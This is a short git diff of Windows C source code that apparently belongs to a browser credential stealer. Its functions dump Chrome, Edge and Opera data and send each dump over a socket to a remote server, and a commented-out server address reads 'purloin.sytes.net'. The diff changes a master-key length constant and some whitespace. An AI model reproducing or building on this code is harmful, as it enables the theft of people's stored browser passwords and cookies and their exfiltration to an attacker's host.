@@ -9,7 +9,7 @@
 #include <tchar.h>
 #include <psapi.h>
 
-#define ENC_MASTER_KEY_LEN 10000
+#define ENC_MASTER_KEY_LEN 357
 #define CIPHER_LEN 512
 #define DEFAULT_BUFLEN 512
 //#define SERVER_IP "purloin.sytes.net"
@@ -41,11 +41,11 @@ int main() {
 	sprintf_s(message, DEFAULT_BUFLEN * sizeof(CHAR), "------------------------ Google Chrome ---------------------\n");
 	send_data(message, ConnectSocket);
 	dump_chrome(ConnectSocket, message, DEFAULT_BUFLEN);
-
+	
 	sprintf_s(message, DEFAULT_BUFLEN * sizeof(CHAR), "------------------------ Microsoft Edge ---------------------\n");
 	send_data(message, ConnectSocket);
 	dump_edge(ConnectSocket, message, DEFAULT_BUFLEN);
-
+	
 	sprintf_s(message, DEFAULT_BUFLEN * sizeof(CHAR), "------------------------ Opera ---------------------\n");
 	send_data(message, ConnectSocket);
 	dump_opera(ConnectSocket, message, DEFAULT_BUFLEN);
